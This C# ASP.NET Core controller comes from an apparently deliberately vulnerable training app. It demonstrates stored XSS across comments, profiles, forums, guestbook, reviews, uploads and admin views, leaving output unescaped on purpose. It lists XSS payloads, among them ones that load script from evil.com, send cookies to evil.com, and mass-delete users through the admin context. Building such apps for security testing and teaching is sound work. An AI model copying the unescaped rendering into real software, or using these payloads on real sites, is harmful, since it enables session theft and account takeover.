using InsecureAppWebNet8.Models;
using InsecureAppWebNet8.ViewModels;
using Microsoft.AspNetCore.Mvc;
using System.Text.Json;

namespace InsecureAppWebNet8.Controllers
{
    public class XssStoredController : Controller
    {
        private readonly Dictionary<string, AttackInfo> _attackInfos;

        // VULNÉRABLE : Données stockées sans sanitisation (simule une base de données)
        private static readonly List<StoredComment> _comments = new()
        {
            new StoredComment { Id = 1, Author = "Admin", Content = "Bienvenue sur notre blog!", CreatedAt = DateTime.Now.AddDays(-7), IsApproved = true },
            new StoredComment { Id = 2, Author = "User1", Content = "Excellent article, merci !", CreatedAt = DateTime.Now.AddDays(-5), IsApproved = true },
            new StoredComment { Id = 3, Author = "Hacker<script>alert('Stored-XSS')</script>", Content = "<img src=x onerror=alert('Persistent XSS!')>", CreatedAt = DateTime.Now.AddDays(-2), IsApproved = false }
        };

        private static readonly List<StoredUserProfile> _profiles = new()
        {
            new StoredUserProfile { Id = 1, Username = "admin", DisplayName = "Administrator", Bio = "Site administrator", Website = "https://example.com", Avatar = "/images/admin.jpg" },
            new StoredUserProfile { Id = 2, Username = "user1", DisplayName = "John Doe", Bio = "Regular user", Website = "https://johndoe.com", Avatar = "/images/user1.jpg" }
        };

        private static readonly List<ForumPost> _forumPosts = new()
        {
            new ForumPost { Id = 1, Title = "Premier post", Content = "Contenu du premier post", Author = "admin", CreatedAt = DateTime.Now.AddDays(-10), Views = 156 },
            new ForumPost { Id = 2, Title = "Discussion sécurité", Content = "Parlons de sécurité web", Author = "user1", CreatedAt = DateTime.Now.AddDays(-8), Views = 89 }
        };

        private static readonly List<GuestbookEntry> _guestbook = new()
        {
            new GuestbookEntry { Id = 1, Name = "Visiteur", Message = "Merci pour ce site !", Email = "visitor@example.com", CreatedAt = DateTime.Now.AddDays(-3) }
        };

        private static readonly List<ProductReview> _reviews = new()
        {
            new ProductReview { Id = 1, ProductName = "Produit A", ReviewerName = "Client", Rating = 5, Comment = "Excellent produit!", CreatedAt = DateTime.Now.AddDays(-1) }
        };

        public XssStoredController()
        {
            _attackInfos = new()
            {
                ["stored-comment"] = new AttackInfo
                {
                    Description = "XSS Stored via commentaires de blog non sanitisés.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/xss/",
                    RiskLevel = "Critical",
                    PayloadExample = "<script>alert('Stored-XSS')</script>",
                    ErrorExplanation = "Les commentaires sont stockés et affichés sans échappement HTML."
                },
                ["stored-profile"] = new AttackInfo
                {
                    Description = "XSS Stored via champs de profil utilisateur.",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/stored",
                    RiskLevel = "Critical",
                    PayloadExample = "<img src=x onerror=alert('Profile-XSS')>",
                    ErrorExplanation = "Les données de profil (bio, site web) sont stockées sans validation."
                },
                ["stored-forum"] = new AttackInfo
                {
                    Description = "XSS Stored via posts de forum et contenu riche.",
                    LearnMoreUrl = "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                    RiskLevel = "Critical",
                    PayloadExample = "<svg onload=alert('Forum-XSS')>",
                    ErrorExplanation = "Le contenu HTML est autorisé dans les posts sans sanitisation."
                },
                ["stored-guestbook"] = new AttackInfo
                {
                    Description = "XSS Stored via livre d'or et messages visiteurs.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/xss/",
                    RiskLevel = "High",
                    PayloadExample = "<iframe src='javascript:alert(1)'></iframe>",
                    ErrorExplanation = "Les messages du livre d'or sont affichés sans filtrage."
                },
                ["stored-review"] = new AttackInfo
                {
                    Description = "XSS Stored via avis et commentaires produits.",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/stored",
                    RiskLevel = "High",
                    PayloadExample = "<details open ontoggle=alert('Review-XSS')>",
                    ErrorExplanation = "Les avis clients sont stockés et affichés sans protection."
                },
                ["stored-admin"] = new AttackInfo
                {
                    Description = "XSS Stored ciblant les administrateurs (privilege escalation).",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/xss/",
                    RiskLevel = "Critical",
                    PayloadExample = "<script>fetch('/admin/users',{method:'POST',body:'action=delete&id=all'})</script>",
                    ErrorExplanation = "XSS exécuté dans le contexte administrateur pour voler des privilèges."
                },
                ["stored-file"] = new AttackInfo
                {
                    Description = "XSS Stored via nom de fichier et métadonnées d'upload.",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/stored",
                    RiskLevel = "High",
                    PayloadExample = "malicious<script>alert('File-XSS')</script>.txt",
                    ErrorExplanation = "Les noms de fichiers uploadés sont affichés sans échappement."
                }
            };
        }

        [HttpGet]
        public IActionResult Index()
        {
            var model = new VulnerabilityViewModel<XssStoredResult>
            {
                AttackType = "",
                Payload = "",
                Results = new List<XssStoredResult>(),
                AttackInfos = _attackInfos
            };

            // VULNÉRABLE : Passer les données stockées à la vue
            ViewBag.CommentsJson = JsonSerializer.Serialize(_comments);
            ViewBag.ProfilesJson = JsonSerializer.Serialize(_profiles);

            return View(model);
        }

        [HttpPost]
        public IActionResult Index(string attackType, string payload)
        {
            payload = payload ?? string.Empty;

            var model = new VulnerabilityViewModel<XssStoredResult>
            {
                AttackType = attackType,
                Payload = payload,
                Results = new List<XssStoredResult>(),
                AttackInfos = _attackInfos
            };

            if (!string.IsNullOrEmpty(attackType))
            {
                var result = ExecuteStoredXss(attackType, payload);
                model.Results.Add(result);
            }

            // VULNÉRABLE : Passer les données mises à jour
            ViewBag.CommentsJson = JsonSerializer.Serialize(_comments);
            ViewBag.ProfilesJson = JsonSerializer.Serialize(_profiles);

            return View(model);
        }

        // VULNÉRABLE : Ajouter un commentaire sans sanitisation
        [HttpPost]
        public IActionResult AddComment(string author, string content, string email)
        {
            var comment = new StoredComment
            {
                Id = _comments.Count + 1,
                Author = author ?? "Anonyme", // VULNÉRABLE
                Content = content ?? "", // VULNÉRABLE
                Email = email ?? "", // VULNÉRABLE
                CreatedAt = DateTime.Now,
                IsApproved = true // Auto-approuvé pour la démo
            };

            _comments.Add(comment);

            return Json(new
            {
                success = true,
                comment = comment,
                message = "Commentaire ajouté avec succès",
                // VULNÉRABLE : HTML généré avec données non échappées
                html = GenerateCommentHtml(comment)
            });
        }

        // VULNÉRABLE : Mettre à jour le profil
        [HttpPost]
        public IActionResult UpdateProfile(string username, string displayName, string bio, string website, string avatar)
        {
            var profile = _profiles.FirstOrDefault(p => p.Username == username);
            if (profile == null)
            {
                profile = new StoredUserProfile
                {
                    Id = _profiles.Count + 1,
                    Username = username ?? "newuser"
                };
                _profiles.Add(profile);
            }

            // VULNÉRABLE : Stockage direct sans validation
            profile.DisplayName = displayName ?? profile.DisplayName; // VULNÉRABLE
            profile.Bio = bio ?? profile.Bio; // VULNÉRABLE
            profile.Website = website ?? profile.Website; // VULNÉRABLE
            profile.Avatar = avatar ?? profile.Avatar; // VULNÉRABLE

            return Json(new
            {
                success = true,
                profile = profile,
                message = "Profil mis à jour",
                // VULNÉRABLE : HTML avec données non échappées
                html = GenerateProfileHtml(profile)
            });
        }

        // VULNÉRABLE : Créer un post de forum
        [HttpPost]
        public IActionResult CreateForumPost(string title, string content, string author)
        {
            var post = new ForumPost
            {
                Id = _forumPosts.Count + 1,
                Title = title ?? "Sans titre", // VULNÉRABLE
                Content = content ?? "", // VULNÉRABLE
                Author = author ?? "Anonyme", // VULNÉRABLE
                CreatedAt = DateTime.Now,
                Views = 0
            };

            _forumPosts.Add(post);

            return Json(new
            {
                success = true,
                post = post,
                message = "Post créé avec succès",
                // VULNÉRABLE : HTML avec contenu riche non filtré
                html = GenerateForumPostHtml(post)
            });
        }

        // VULNÉRABLE : Ajouter une entrée au livre d'or
        [HttpPost]
        public IActionResult AddGuestbookEntry(string name, string message, string email, string website)
        {
            var entry = new GuestbookEntry
            {
                Id = _guestbook.Count + 1,
                Name = name ?? "Visiteur", // VULNÉRABLE
                Message = message ?? "", // VULNÉRABLE
                Email = email ?? "", // VULNÉRABLE
                Website = website ?? "", // VULNÉRABLE
                CreatedAt = DateTime.Now
            };

            _guestbook.Add(entry);

            return Json(new
            {
                success = true,
                entry = entry,
                message = "Message ajouté au livre d'or",
                // VULNÉRABLE : HTML non échappé
                html = GenerateGuestbookHtml(entry)
            });
        }

        // VULNÉRABLE : Ajouter un avis produit
        [HttpPost]
        public IActionResult AddReview(string productName, string reviewerName, int rating, string comment)
        {
            var review = new ProductReview
            {
                Id = _reviews.Count + 1,
                ProductName = productName ?? "Produit", // VULNÉRABLE
                ReviewerName = reviewerName ?? "Client", // VULNÉRABLE
                Rating = Math.Max(1, Math.Min(5, rating)),
                Comment = comment ?? "", // VULNÉRABLE
                CreatedAt = DateTime.Now
            };

            _reviews.Add(review);

            return Json(new
            {
                success = true,
                review = review,
                message = "Avis ajouté",
                // VULNÉRABLE : HTML avec données non filtrées
                html = GenerateReviewHtml(review)
            });
        }

        // VULNÉRABLE : Upload de fichier avec nom malveillant
        [HttpPost]
        public IActionResult UploadFile(IFormFile file, string description, string category)
        {
            if (file != null)
            {
                var fileInfo = new
                {
                    // VULNÉRABLE : Nom de fichier non échappé
                    name = file.FileName,
                    size = file.Length,
                    type = file.ContentType,
                    description = description ?? "", // VULNÉRABLE
                    category = category ?? "General", // VULNÉRABLE
                    uploadedAt = DateTime.Now
                };

                return Json(new
                {
                    success = true,
                    file = fileInfo,
                    message = "Fichier uploadé",
                    // VULNÉRABLE : HTML avec nom de fichier non échappé
                    html = $@"
                        <div class='file-entry'>
                            <h6>{fileInfo.name}</h6>
                            <p>Catégorie: {fileInfo.category}</p>
                            <p>Description: {fileInfo.description}</p>
                            <small>Uploadé le {fileInfo.uploadedAt:dd/MM/yyyy}</small>
                        </div>"
                });
            }

            return Json(new { success = false, message = "Aucun fichier sélectionné" });
        }

        // VULNÉRABLE : Page d'administration avec XSS stocké
        [HttpGet]
        public IActionResult Admin()
        {
            ViewBag.PendingComments = _comments.Where(c => !c.IsApproved).ToList();
            ViewBag.AllProfiles = _profiles;
            ViewBag.RecentPosts = _forumPosts.OrderByDescending(p => p.CreatedAt).Take(10).ToList();

            return View();
        }

        // VULNÉRABLE : Approuver des commentaires (cible pour XSS admin)
        [HttpPost]
        public IActionResult ApproveComment(int commentId)
        {
            var comment = _comments.FirstOrDefault(c => c.Id == commentId);
            if (comment != null)
            {
                comment.IsApproved = true;

                return Json(new
                {
                    success = true,
                    message = $"Commentaire de {comment.Author} approuvé", // VULNÉRABLE
                    // VULNÉRABLE : HTML avec données admin
                    html = $"<div class='alert alert-success'>Commentaire approuvé: {comment.Content}</div>"
                });
            }

            return Json(new { success = false, message = "Commentaire non trouvé" });
        }

        // VULNÉRABLE : Recherche dans le contenu stocké
        [HttpGet]
        public IActionResult Search(string q)
        {
            var results = new List<object>();

            if (!string.IsNullOrEmpty(q))
            {
                // Recherche dans les commentaires
                var commentResults = _comments.Where(c =>
                    c.Content.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                    c.Author.Contains(q, StringComparison.OrdinalIgnoreCase))
                    .Select(c => new { Type = "Comment", Data = c });

                // Recherche dans les profils
                var profileResults = _profiles.Where(p =>
                    (p.Bio ?? "").Contains(q, StringComparison.OrdinalIgnoreCase) ||
                    (p.DisplayName ?? "").Contains(q, StringComparison.OrdinalIgnoreCase))
                    .Select(p => new { Type = "Profile", Data = p });

                results.AddRange(commentResults);
                results.AddRange(profileResults);
            }

            // VULNÉRABLE : Afficher les résultats avec query non échappée
            ViewBag.SearchQuery = q; // VULNÉRABLE
            ViewBag.SearchResults = results;

            return View("SearchResults");
        }

        // Helper methods pour générer du HTML vulnérable
        private string GenerateCommentHtml(StoredComment comment)
        {
            // VULNÉRABLE : Pas d'échappement HTML
            return $@"
                <div class='stored-comment' data-id='{comment.Id}'>
                    <div class='comment-header'>
                        <strong>{comment.Author}</strong>
                        <small class='text-muted'>{comment.CreatedAt:dd/MM/yyyy HH:mm}</small>
                    </div>
                    <div class='comment-content'>
                        {comment.Content}
                    </div>
                </div>";
        }

        private string GenerateProfileHtml(StoredUserProfile profile)
        {
            // VULNÉRABLE : Tous les champs sans échappement
            return $@"
                <div class='user-profile'>
                    <div class='profile-header'>
                        <img src='{profile.Avatar}' alt='{profile.DisplayName}' class='profile-avatar'>
                        <h4>{profile.DisplayName}</h4>
                        <span class='username'>@{profile.Username}</span>
                    </div>
                    <div class='profile-bio'>
                        {profile.Bio}
                    </div>
                    <div class='profile-links'>
                        <a href='{profile.Website}' target='_blank'>{profile.Website}</a>
                    </div>
                </div>";
        }

        private string GenerateForumPostHtml(ForumPost post)
        {
            // VULNÉRABLE : Contenu riche non filtré
            return $@"
                <div class='forum-post'>
                    <h3>{post.Title}</h3>
                    <div class='post-meta'>
                        Par <strong>{post.Author}</strong> le {post.CreatedAt:dd/MM/yyyy}
                        - {post.Views} vues
                    </div>
                    <div class='post-content'>
                        {post.Content}
                    </div>
                </div>";
        }

        private string GenerateGuestbookHtml(GuestbookEntry entry)
        {
            // VULNÉRABLE : Tous les champs exposés
            var websiteLink = !string.IsNullOrEmpty(entry.Website)
                ? $"- <a href='{entry.Website}'>{entry.Website}</a>"
                : "";

            return $@"
                <div class='guestbook-entry'>
                    <div class='entry-header'>
                        <strong>{entry.Name}</strong>
                        {websiteLink}
                        <small>{entry.CreatedAt:dd/MM/yyyy}</small>
                    </div>
                    <div class='entry-message'>
                        {entry.Message}
                    </div>
                </div>";
        }

        private string GenerateReviewHtml(ProductReview review)
        {
            // VULNÉRABLE : Avis non filtré
            var stars = string.Join("", Enumerable.Repeat("★", review.Rating)) +
                       string.Join("", Enumerable.Repeat("☆", 5 - review.Rating));

            return $@"
                <div class='product-review'>
                    <div class='review-header'>
                        <strong>{review.ProductName}</strong>
                        <span class='rating'>{stars}</span>
                    </div>
                    <div class='review-author'>Par {review.ReviewerName}</div>
                    <div class='review-comment'>{review.Comment}</div>
                    <small class='review-date'>{review.CreatedAt:dd/MM/yyyy}</small>
                </div>";
        }

        private XssStoredResult ExecuteStoredXss(string attackType, string payload)
        {
            return attackType switch
            {
                "stored-comment" => new XssStoredResult
                {
                    AttackType = attackType,
                    Success = true,
                    Message = "XSS Stored via commentaire injecté en base",
                    StoredLocation = "Comments table",
                    ImpactLevel = "Critical",
                    AffectedUsers = "Tous les visiteurs du blog",
                    Persistence = "Permanent jusqu'à suppression manuelle"
                },
                "stored-profile" => new XssStoredResult
                {
                    AttackType = attackType,
                    Success = true,
                    Message = "XSS Stored via profil utilisateur",
                    StoredLocation = "User profiles table",
                    ImpactLevel = "Critical",
                    AffectedUsers = "Visiteurs du profil + administrateurs",
                    Persistence = "Permanent jusqu'à modification du profil"
                },
                "stored-forum" => new XssStoredResult
                {
                    AttackType = attackType,
                    Success = true,
                    Message = "XSS Stored via post de forum",
                    StoredLocation = "Forum posts table",
                    ImpactLevel = "Critical",
                    AffectedUsers = "Tous les lecteurs du forum",
                    Persistence = "Permanent jusqu'à suppression du post"
                },
                "stored-admin" => new XssStoredResult
                {
                    AttackType = attackType,
                    Success = true,
                    Message = "XSS Stored ciblant les administrateurs",
                    StoredLocation = "Admin-visible content",
                    ImpactLevel = "Critical",
                    AffectedUsers = "Administrateurs et modérateurs",
                    Persistence = "Exécuté à chaque connexion admin"
                },
                _ => new XssStoredResult
                {
                    AttackType = attackType,
                    Success = false,
                    Message = "Type d'attaque non reconnu",
                    StoredLocation = "",
                    ImpactLevel = "",
                    AffectedUsers = "",
                    Persistence = ""
                }
            };
        }

        // Endpoint de test pour SAST
        [HttpGet]
        public IActionResult TestEndpoints()
        {
            return Json(new
            {
                endpoints = new[]
                {
                    "POST /XssStored/AddComment - Commentaires sans sanitisation",
                    "POST /XssStored/UpdateProfile - Profils utilisateur vulnérables",
                    "POST /XssStored/CreateForumPost - Posts forum avec HTML",
                    "POST /XssStored/AddGuestbookEntry - Livre d'or non filtré",
                    "POST /XssStored/AddReview - Avis produits vulnérables",
                    "POST /XssStored/UploadFile - Noms fichiers non échappés",
                    "GET /XssStored/Admin - Interface admin vulnérable",
                    "POST /XssStored/ApproveComment - Actions admin XSS",
                    "GET /XssStored/Search - Recherche dans contenu stocké"
                },
                vulnerabilities = new[]
                {
                    "Stored XSS in blog comments",
                    "Stored XSS in user profiles",
                    "Stored XSS in forum posts",
                    "Stored XSS in guestbook entries",
                    "Stored XSS in product reviews",
                    "Stored XSS in file names",
                    "Stored XSS targeting administrators",
                    "No input sanitization on storage",
                    "No output encoding on display",
                    "Rich text content without filtering",
                    "HTML content stored as-is",
                    "No CSP headers"
                },
                storedLocations = new[]
                {
                    "Comments database table",
                    "User profiles table",
                    "Forum posts content",
                    "Guestbook entries",
                    "Product reviews",
                    "File metadata",
                    "Admin interface content"
                },
                persistentPayloads = new[]
                {
                    "<script>alert('Stored-XSS')</script>",
                    "<img src=x onerror=alert('Persistent')>",
                    "<svg onload=fetch('/admin/users').then(r=>r.text()).then(console.log)>",
                    "<iframe src='javascript:alert(document.cookie)'></iframe>",
                    "<details open ontoggle=alert('Stored')>Click me</details>",
                    "<script>document.body.appendChild(document.createElement('script')).src='//evil.com/xss.js'</script>",
                    "<img src='x' onerror='this.onerror=null;this.src=\"//evil.com/steal?c=\"+document.cookie'>",
                    "<script>setInterval(()=>fetch('//evil.com/beacon?url='+location.href),5000)</script>"
                }
            });
        }
    }

    // Modèles pour XSS Stored
    public class XssStoredResult
    {
        public string AttackType { get; set; } = string.Empty;
        public bool Success { get; set; }
        public string Message { get; set; } = string.Empty;
        public string StoredLocation { get; set; } = string.Empty;
        public string ImpactLevel { get; set; } = string.Empty;
        public string AffectedUsers { get; set; } = string.Empty;
        public string Persistence { get; set; } = string.Empty;
    }

    public class StoredComment
    {
        public int Id { get; set; }
        public string Author { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string Email { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
        public bool IsApproved { get; set; }
    }

    public class StoredUserProfile
    {
        public int Id { get; set; }
        public string Username { get; set; } = string.Empty;
        public string DisplayName { get; set; } = string.Empty;
        public string Bio { get; set; } = string.Empty;
        public string Website { get; set; } = string.Empty;
        public string Avatar { get; set; } = string.Empty;
    }

    public class ForumPost
    {
        public int Id { get; set; }
        public string Title { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string Author { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
        public int Views { get; set; }
    }

    public class GuestbookEntry
    {
        public int Id { get; set; }
        public string Name { get; set; } = string.Empty;
        public string Message { get; set; } = string.Empty;
        public string Email { get; set; } = string.Empty;
        public string Website { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
    }

    public class ProductReview
    {
        public int Id { get; set; }
        public string ProductName { get; set; } = string.Empty;
        public string ReviewerName { get; set; } = string.Empty;
        public int Rating { get; set; }
        public string Comment { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
    }
}